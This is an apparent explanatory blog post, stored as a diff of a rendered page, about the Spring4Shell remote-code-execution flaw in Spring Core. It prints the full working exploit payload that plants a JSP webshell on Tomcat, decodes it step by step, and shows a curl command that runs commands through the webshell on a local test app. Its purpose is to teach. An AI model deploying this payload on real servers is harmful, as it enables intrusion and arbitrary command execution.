@@ -1,0 +1,140 @@
+I"z <h1 id="learning-about-spring4shell-exploit">Learning about Spring4Shell exploit</h1>
+
+<p>I’m pretty sure you might have heard about the infamous “Spring4Shell” exploit by now, so rather than boring you with the details about how it was discovered or how to exploit it. I’d like to explain how and why it works.</p>
+
+<p>There are two parts to this:</p>
+
+<ol>
+  <li>Spring4Shell: RCE in Spring Core ≤ 5.3.17</li>
+  <li>CVE-2022–22964: RCE in Spring Cloud Function (≤ 3.1.6 and ≤ 3.2.2)</li>
+</ol>
+
+<p>In this blog, I’m going to write about the vulnerability in Spring Core.</p>
+
+<p>Rapid7 team have recreated and explained the entire thing really well.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package net.javaguides.springmvc.helloworld.controller;
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.InitBinder;
+import org.springframework.web.bind.annotation.RequestMapping;  import net.javaguides.springmvc.helloworld.model.HelloWorld;
+/\*\*
+  \*
+  @author Ramesh Fadatare
+  \*/
+@Controller
+public class HelloWorldController {
+    @RequestMapping("/rapid7")
+    public void vulnerable(HelloWorld model) {
+    }
+}
+</code></pre></div></div>
+
+<p>So, what’s happening here is, the <code class="language-plaintext highlighter-rouge">HelloWorldController</code> handles the HTTP requests to “http://target.com/appname/rapid7”, the function <code class="language-plaintext highlighter-rouge">vulnerable</code> will handle those requests and the values passed along with them.</p>
+
+<p>Also, this function has a POJO (Plain Old Java Object) parameter.</p>
+
+<p>Here the vulnerability lies within the <code class="language-plaintext highlighter-rouge">@RequestMapping</code> annotation, which enables a “Class Loader Manipulation” attack. Let’s say we have something like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>public class Counter {
+    private long count;
+    public long getCount() {
+        return count;
+    }
+    public void setCount() {
+        this.count = count;
+    }
+}@Controller
+public class HelloController {
+    @PostMapping("/count")
+    public String getCount(@ModelAttribute Counter count, Model model) {
+        return "Here is the count";
+    }
+}
+</code></pre></div></div>
+
+<p>Now, making a request to will give us the response “Here is the count”. That part is fine, it works really well, the problem arises when something other than just some random text is given as the request parameter, like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.resources.context.parent.pipeline .first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(% 22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRunt ime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int% 20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20 while((a%3Din.read(b))3D-1)%7B%20out.println(new%20String(b))%3B%20%7 D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context .parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources .context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.cl assLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;cl ass.module.classLoader.resources.context.parent.pipeline.first.fileDat eFormat=
+</code></pre></div></div>
+
+<p>Okay, that doesn’t make much sense. Decoding and breaking it down…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
+if("j".equals(request.getParameter("pwd"))){
+  java.io.InputStream in = %{c1}i.getRuntime()
+      .exec(request.getParameter("cmd"))
+      .getInputStream();
+  int a = -1;
+  byte\[\] b = new byte\[2048\];
+  while((a=in.read(b))3D-1){
+     out.println(new String(b));
+  } } %{suffix}i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+</code></pre></div></div>
+
+<p>First, it’s probably creating a basic JSP webshell payload</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i
+if("j".equals(request.getParameter("pwd"))){
+  java.io.InputStream in = %{c1}i.getRuntime()
+      .exec(request.getParameter("cmd"))
+      .getInputStream();
+  int a = -1;
+  byte\[\] b = new byte\[2048\];
+  while((a=in.read(b))3D-1){
+     out.println(new String(b));
+  } } %{suffix}i
+</code></pre></div></div>
+
+<p>Next, specifying the extension of the file it’s going to store the payload into</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
+</code></pre></div></div>
+
+<p>After that, it specifies the directory where the webshell can be kept</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
+</code></pre></div></div>
+
+<p>Giving the webshell a name</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar
+</code></pre></div></div>
+
+<p>About this last one, I’m not sure exactly what it’s doing, but just by looking at it, it seems like it determines the “File Date Format”, maybe ?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
+</code></pre></div></div>
+
+<p>So, that <code class="language-plaintext highlighter-rouge">curl</code> request is essentially is a collection of several statements joined together so that it is executed in one go.</p>
+
+<p>After the payload file tomcatwar.jsp has been created in the webapp/ROOT directory we can execute commands:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://localhost:8000/tomcatwar.jsp?pwd=j&amp;cmd=whoami
+</code></pre></div></div>
+
+<p>This will give you the contents of <code class="language-plaintext highlighter-rouge">tomcatwar.jsp</code> file along with the result of <code class="language-plaintext highlighter-rouge">whoami</code></p>
+
+<p>I used this repo to host a vulnerable Spring Framework Application locally and test this vulenrability.</p>
+
+<p><a href="https://github.com/jbaines-r7/spring4shell_vulnapp">https://github.com/jbaines-r7/spring4shell_vulnapp</a></p>
+
+<p>References:</p>
+
+<p>[</p>
+
+<h2 id="spring4shell-zero-day-vulnerability-in-spring-framework--rapid7-blog">Spring4Shell: Zero-Day Vulnerability in Spring Framework | Rapid7 Blog</h2>
+
+<h3 id="if-you-are-like-many-in-the-cybersecurity-industry-any-mention-of-a-zero-day-in-an-open-source-software-oss-library">If you are like many in the cybersecurity industry, any mention of a zero-day in an open-source software (OSS) library…</h3>
+
+<p>www.rapid7.com</p>
+
+<p>](https://www.rapid7.com/blog/post/2022/03/30/spring4shell-zero-day-vulnerability-in-spring-framework/)[</p>
+
+<h2 id="spring4shell-security-analysis-of-the-latest-java-rce-0-day-vulnerabilities-in-spring--lunasec">Spring4Shell: Security Analysis of the latest Java RCE ‘0-day’ vulnerabilities in Spring | LunaSec</h2>
+
+<h3 id="logo-courtesy-of-daniel-christensen-on-march-29th-2022-two-rce-vulnerabilities-were-being-discussed-on-the-internet">Logo courtesy of Daniel Christensen. On March 29th, 2022, two RCE vulnerabilities were being discussed on the internet…</h3>
+
+<p>www.lunasec.io</p>
+
+<p>](https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/)</p>
+:ET
